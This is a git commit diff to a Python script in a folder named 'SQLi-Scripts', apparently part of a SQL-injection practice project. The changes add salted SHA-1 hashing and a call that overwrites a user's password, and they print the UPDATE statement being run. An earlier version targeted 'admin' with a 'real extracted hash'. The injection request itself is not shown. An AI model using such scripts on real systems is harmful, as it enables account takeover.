702d3ea05e0958dba820d3297b34b15b02af5fb3
Kakha8 <kakha.kudava.98@gmail.com>
2025-12-02 15:10:47 +0200

    hashing for password update

--- SQLi-Scripts/change-password.py
+++ SQLi-Scripts/change-password.py
@@ -13,16 +13,26 @@ def change_password(user, password_hash):
     print("Status:", resp.status_code)
     print("Response:", resp.text)
 
+    print(f"Update script ran: UPDATE users SET password='{hash}' WHERE user_name='{user}';")
+
+def get_salt():
+    with open("salt.txt", "r") as file:
+        salt_value = file.read()
+
+    return salt_value
+
 def sha1_hash(salt, password):
     h = hashlib.sha1()
     h.update((salt + password).encode())
 
-    print(h.hexdigest())
+    print("Password hash: " + h.hexdigest())
+    return h.hexdigest()
 
 
 if __name__ == '__main__':
-    user = "admin"  # your account
-    hash = "5baa"  # replace with real extracted hash
+    user = "kakha1"
+    salt = get_salt()
+    password = "kakhaPassword"
+    hash = sha1_hash(salt, password)
 
-    #change_password(user, hash)
-    sha1_hash("ThisIsSalt", "gela")
+    change_password(user, hash)
